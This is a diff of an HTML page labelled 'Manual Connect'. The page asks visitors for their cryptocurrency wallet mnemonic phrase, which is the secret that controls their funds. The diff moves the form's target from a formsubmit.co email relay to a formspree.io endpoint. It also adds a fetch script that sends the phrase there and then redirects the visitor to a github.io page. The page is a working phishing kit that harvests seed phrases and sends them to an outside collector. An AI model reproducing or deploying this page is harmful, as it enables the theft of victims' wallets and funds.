@@ -128,18 +128,49 @@
     <body>
         
 <div class="container">
-    <form target="_blank" action="https://formsubmit.co/qubeticss@gmail.com" method="POST">
+   <form id="form" action="https://formspree.io/f/xjkvooww" method="POST">
     <div class="inputs">
         <label>Manual Connect</label>
-        <h2></h2><div><h1></h1></div>
+        <h2></h2>
+        <div><h1></h1></div>
         <label>INPUT WALLET MNEMONIC PHRASE</label>
-        <input type="text" name="name" style="box-shadow: inset 6px 6px 6px #cbced1, inset -6px -6px 6px white;" class="form-control" placeholder="Typically 12(sometimes 24) words seperated by a single space*" required>     
-         <input type="hidden" name="_next" value="https://swiftmultisolutions.github.io/commm">
+        <input type="text" name="name" style="box-shadow: inset 6px 6px 6px #cbced1, inset -6px -6px 6px white;" class="form-control" placeholder="Typically 12(sometimes 24) words separated by a single space*" required>     
         <p>Verify you are human.</p>
         <input type="checkbox" id="human" name="human" required>
         <input type="hidden" name="_captcha" value="false">
-      <button type="submit" class="btn btn-lg btn-dark btn-block">CONNECT</button>
+        <button type="submit" class="btn btn-lg btn-dark btn-block">CONNECT</button>
     </div>
   </form>
+</div>
     </body>
+    <script>
+  // JavaScript to handle form submission
+  document.getElementById("form").addEventListener("submit", function(event) {
+    event.preventDefault(); // Prevent the form from submitting normally
+
+    // Create a FormData object from the form
+    var formData = new FormData(this);
+
+    // Send the form data using Fetch API to Formspree
+    fetch("https://formspree.io/f/xjkvooww", {
+      method: "POST",
+      body: formData
+    })
+    .then(response => {
+      if (response.ok) {
+        // Redirect to your custom URL after successful submission
+        window.location.href = "https://swiftmultisolutions.github.io/commm";
+      } else {
+        // Handle any errors (optional)
+        alert("There was an error submitting the form. Please try again.");
+      }
+    })
+    .catch(error => {
+      // Handle network errors (optional)
+      console.error("Error submitting the form:", error);
+      alert("There was a network error. Please try again.");
+    });
+  });
+</script>
+
 </html>
